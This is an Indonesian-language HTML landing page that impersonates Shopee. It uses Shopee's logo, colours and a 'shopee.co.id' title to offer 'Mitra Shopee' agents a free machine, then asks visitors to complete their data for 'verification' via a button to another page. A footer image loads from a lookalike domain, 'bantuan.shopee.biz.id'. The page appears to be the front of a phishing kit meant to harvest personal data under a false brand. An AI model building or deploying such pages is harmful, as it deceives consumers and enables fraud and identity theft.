<!doctype html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="theme-color" content="#ED4D2D">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mitra Shopee Partner || shopee.co.id</title>
    
    <meta property="og:description" content="Layanan mitra Shopee partner.">
    <meta property="og:image" content="https://pelitaonline.co/wp-content/uploads/2025/12/2025-10-21T03_48_37.070Zgroup.jpeg">
    <meta property="og:type" content="website">
    
    <style>
        body {
            background-color: #EE4D2D;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            align-items: center;
        }

        .logo {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 40px;
            margin-bottom: 20px;
        }

        .logo img {
            max-width: 150px;
            height: auto;
        }

        .container {
            width: 85%;
            max-width: 320px;
            padding: 25px;
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            text-align: center;
        }
        
        marquee {
            width: 100%;
            font-size: 12px;
            background-color: #f9f9f9;
            padding: 8px 0;
            border: 2px solid #ffd560;
            border-radius: 8px;
            margin-bottom: 15px;
            color: #333;
        }

        h1 {
            font-size: 16px;
            font-weight: bold;
            color: #EE4D2D;
            background: #fff3d1;
            padding: 10px;
            margin: 10px 0;
            border-radius: 8px;
            border: 1px dashed #EE4D2D;
        }

        .btn {
            width: 100%;
            height: 50px;
            border: none;
            border-radius: 12px;
            background: linear-gradient(135deg, #FF6633 0%, #EE4D2D 100%);
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            transition: transform 0.2s;
        }

        .btn:active {
            transform: scale(0.95);
        }

        footer {
            margin-top: 30px;
            width: 100%;
            text-align: center;
            padding-bottom: 20px;
        }

        footer img {
            max-width: 90%;
            height: auto;
            border-radius: 10px;
        }
    </style>
</head>
<body>

    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fe/Shopee.svg/1200px-Shopee.svg.png" alt="Shopee Logo">
    </div>

    <div class="container">
        <marquee direction="left">
            Open Pre Order gratis untuk agen Mitra Shopee!!!!! Sekarang setiap agen Mitra Shopee mendapatkan mesinnya secara gratis.. Ayo Ambil sekarang.
        </marquee>
        
        <h1>Ajukan Order dan lengkapi datamu untuk verifikasi dan validasi</h1>
        
        <p style="font-size: 12px; color: #666; margin-bottom: 15px;">Silakan klik tombol di bawah untuk proses pengajuan order Anda.</p>
        
        <button class="btn" onclick="redirectToForm()">Dapatkan Sekarang</button>
    </div>

    <footer>
        <img src="https://bantuan.shopee.biz.id/assets/FB_IMG_1769694634688.jpg" alt="Banner Info">
    </footer>

    <script>
        function redirectToForm() {
            // Menggunakan tujuan redirect dari Kode 1
            window.location.href = 'halamantoko.html';
        }
    </script>

</body>
</html>
